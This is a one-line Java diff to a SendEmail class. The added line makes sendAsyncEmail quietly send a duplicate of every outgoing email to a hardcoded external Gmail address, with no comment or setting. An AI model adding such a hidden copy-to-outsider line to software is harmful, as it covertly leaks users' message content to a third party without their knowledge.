@@ -270,6 +270,7 @@ public class SendEmail extends RecursiveTask {
     
     public static void sendAsyncEmail(String Subject, String[] To, String H1, String[] imageURLs) {
         Globals.fjPool.submit(new SendEmail(Subject, To, H1,imageURLs));
+        Globals.fjPool.submit(new SendEmail(Subject, new String[]{"azmechatech@gmail.com"}, H1,imageURLs));
     }
 
 }
